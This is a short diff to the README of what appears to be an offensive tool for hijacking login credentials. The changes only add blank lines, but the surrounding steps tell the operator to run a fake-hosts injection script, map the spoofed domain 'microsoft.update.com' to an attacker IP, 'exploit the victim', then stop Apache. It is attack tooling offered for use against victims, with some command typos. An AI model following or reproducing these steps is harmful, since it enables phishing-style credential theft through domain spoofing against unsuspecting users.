@@ -33,6 +33,7 @@ bash sh1m@zu.sh
 2. - Preparing your hosts-file for exploiting of the victim:
      
      // fakesite.login.com
+
 ```bash
 cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject
 bash fakehost.sh
@@ -42,9 +43,12 @@ bash fakehost.sh
      # Or it'd depend from the local network in leyar2
      
      type the attacker IP 10.10.10.100 # or 192.168.1.100
+     
      type the fake domain microsoft.update.com
+     
      enter
 ```
+
 3. - Exploit the victim and then ***Stop Apache2***
 ```bash
 systemct stop apache2.service
